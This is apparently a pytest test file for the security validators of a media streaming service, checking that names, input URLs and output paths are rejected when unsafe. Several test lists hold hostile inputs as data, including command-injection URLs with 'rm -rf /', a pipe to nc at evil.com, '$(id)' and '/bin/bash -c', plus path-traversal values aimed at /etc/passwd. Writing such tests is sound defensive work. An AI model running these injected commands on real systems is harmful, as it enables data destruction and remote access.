import pytest
import os
import tempfile

from src.security import (
    validate_safe_name,
    safe_media_path,
    validate_input_url,
    validate_output_path,
    ALLOWED_URL_SCHEMES,
    DANGEROUS_CHARS
)


class TestValidateSafeName:
    """Test validate_safe_name function"""

    def test_valid_names(self):
        """Test valid names pass validation"""
        valid_names = [
            "stream123",
            "test-stream",
            "my_stream.name",
            "CHANNEL-1_2",
            "a" * 50,  # Long but valid
        ]
        for name in valid_names:
            result = validate_safe_name(name)
            assert result == name

    def test_invalid_names(self):
        """Test invalid names raise ValueError"""
        invalid_names = [
            "",  # Empty
            None,  # None
            "../etc/passwd",  # Path traversal
            "stream with spaces",  # Spaces
            "stream/123",  # Slash
            "stream\\123",  # Backslash
            "stream$123",  # Dollar sign
            "stream;rm",  # Semicolon
            "stream|cat",  # Pipe
            "stream&",  # Ampersand
            "stream>out",  # Greater than
            "stream<in",  # Less than
            "stream`",  # Backtick
            "stream'",  # Single quote
            'stream"',  # Double quote
        ]
        for name in invalid_names:
            with pytest.raises(ValueError):
                validate_safe_name(name)

    def test_field_name_in_error(self):
        """Test field name is included in error message"""
        with pytest.raises(ValueError) as exc_info:
            validate_safe_name("bad/name", "stream_id")
        assert "stream_id" in str(exc_info.value)


class TestSafeMediaPath:
    """Test safe_media_path function"""

    def test_valid_paths(self):
        """Test valid path joins"""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Normal path
            result = safe_media_path(tmpdir, "stream1", "file.ts")
            assert result == os.path.join(tmpdir, "stream1", "file.ts")

            # Single part
            result = safe_media_path(tmpdir, "playlist.m3u8")
            assert result == os.path.join(tmpdir, "playlist.m3u8")

    def test_path_traversal_attempt(self):
        """Test path traversal attempts are blocked"""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Try to escape base directory
            with pytest.raises(ValueError):
                safe_media_path(tmpdir, "../../etc/passwd")

            with pytest.raises(ValueError):
                safe_media_path(tmpdir, "stream", "../../etc/passwd")

    def test_none_result_raises(self):
        """Test when safe_join returns None, ValueError is raised"""
        with pytest.raises(ValueError):
            safe_media_path("/base", "../escape")


class TestValidateInputUrl:
    """Test validate_input_url for command injection prevention"""

    def test_valid_urls(self):
        """Test valid URLs pass validation"""
        valid_urls = [
            "rtmp://localhost/live/stream",
            "rtsp://192.168.1.1:554/stream",
            "http://example.com/stream.flv",
            "https://example.com/secure/stream.m3u8",
            "file:///mnt/media/input.ts",
            "srt://10.0.0.1:9710",
            "udp://239.0.0.1:1234",
            "tcp://source.example:8000",
        ]
        for url in valid_urls:
            result = validate_input_url(url)
            assert result == url

    def test_empty_url(self):
        """Test empty URL is rejected"""
        with pytest.raises(ValueError):
            validate_input_url("")
        with pytest.raises(ValueError):
            validate_input_url(None)

    def test_unsupported_scheme(self):
        """Test unsupported URL schemes are rejected"""
        unsupported_urls = [
            "ftp://example.com/file.ts",  # FTP not allowed
            "ssh://server/path",  # SSH not allowed
            "file://~/secret",  # Home dir expansion not safe
            "javascript:alert(1)",  # JavaScript
            "data:text/plain;base64,SGVsbG8=",  # Data URLs
            "://no-scheme",  # Invalid format
        ]
        for url in unsupported_urls:
            with pytest.raises(ValueError):
                validate_input_url(url)

    def test_command_injection_attempts(self):
        """Test command injection attempts are caught"""
        injection_urls = [
            # Command substitution
            "rtmp://localhost/live/stream;rm -rf /",
            "rtmp://localhost/live/stream && /bin/evil",
            "rtmp://localhost/live/stream | nc evil.com",
            "rtmp://localhost/live/stream `id`",
            "rtmp://localhost/live/stream$(id)",
            # Shell redirection
            "rtmp://localhost/live/stream > /tmp/pwned",
            "rtmp://localhost/live/stream 2>&1",
            # Escape to shell
            "rtmp://localhost/live/stream; /bin/bash -c 'evil'",
            # Multiple dangerous chars
            'rtmp://localhost/stream";echo pwned',
            "rtmp://localhost/stream';echo pwned",
        ]
        for url in injection_urls:
            with pytest.raises(ValueError):
                validate_input_url(url)

    def test_dangerous_characters(self):
        """Test each dangerous character is caught"""
        base_url = "rtmp://localhost/stream"
        for char in DANGEROUS_CHARS:
            test_url = base_url + char
            try:
                validate_input_url(test_url)
                # If no exception, it should be a non-dangerous character
                # (but DANGEROUS_CHARS should only contain dangerous ones)
            except ValueError:
                pass  # Expected


class TestValidateOutputPath:
    """Test validate_output_path function"""

    def test_valid_paths(self):
        """Test valid output paths"""
        with tempfile.TemporaryDirectory() as tmpdir:
            valid_paths = [
                os.path.join(tmpdir, "output.ts"),
                os.path.join(tmpdir, "subdir", "output.ts"),
                "/mnt/hls/stream1/playlist.m3u8",
            ]
            for path in valid_paths:
                result = validate_output_path(path)
                assert result == path

    def test_empty_path(self):
        """Test empty path is rejected"""
        with pytest.raises(ValueError):
            validate_output_path("")

    def test_path_traversal(self):
        """Test path traversal in output path"""
        traversal_paths = [
            "/mnt/hls/../../etc/passwd",
            "/mnt/hls/stream/../../../tmp/evil",
            "stream/../escape",
        ]
        for path in traversal_paths:
            with pytest.raises(ValueError):
                validate_output_path(path)

    def test_dangerous_chars_in_path(self):
        """Test dangerous characters in output path"""
        dangerous_paths = [
            "/mnt/hls/stream$(id)",
            "/mnt/hls/stream;ls",
            "/mnt/hls/stream`id`",
        ]
        for path in dangerous_paths:
            with pytest.raises(ValueError):
                validate_output_path(path)


class TestAllowedSchemes:
    """Test ALLOWED_URL_SCHEMES constant"""

    def test_expected_schemes_present(self):
        """Test expected schemes are in the allowed list"""
        expected_schemes = {
            'rtmp://',
            'rtsp://',
            'http://',
            'https://',
            'file://',
            'srt://',
            'udp://',
            'tcp://'
        }
        assert expected_schemes.issubset(ALLOWED_URL_SCHEMES)
